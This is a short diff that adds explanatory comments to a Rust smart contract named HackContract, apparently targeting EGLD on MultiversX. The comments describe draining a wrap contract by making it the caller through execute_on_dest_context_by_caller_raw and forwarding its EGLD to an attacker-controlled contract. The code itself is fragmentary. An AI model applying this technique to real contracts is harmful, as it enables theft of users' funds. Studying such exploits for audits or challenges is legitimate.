@@ -34,6 +34,7 @@ pub trait HackContract {
         self.main_contract().set(&main_contract);
     }
 
+    // We wrap a small amount of EGLD and add the wrap_egld_callback endpoint that the wrap contract will call.
     #[endpoint(wrapEgld)]
     #[payable("EGLD")]
     fn wrap_egld(&self, wrap_contract: ManagedAddress) {
@@ -45,6 +46,9 @@ pub trait HackContract {
         .execute_on_dest_context()
     }
 
+    // The wrap contract calls this function and thanks to execute_on_dest_context_by_caller_raw ..
+    // we are able to put the wrap contract as the caller and we can therefore send all the EGLDs that it has.
+    // And then we send the amount the contrat just send us to our our main contract with the sendEgldToMainContract endpoint (the one we use for withdrawal the funds)
     #[endpoint]
     #[payable("*")]
     fn wrap_egld_callback(&self) {
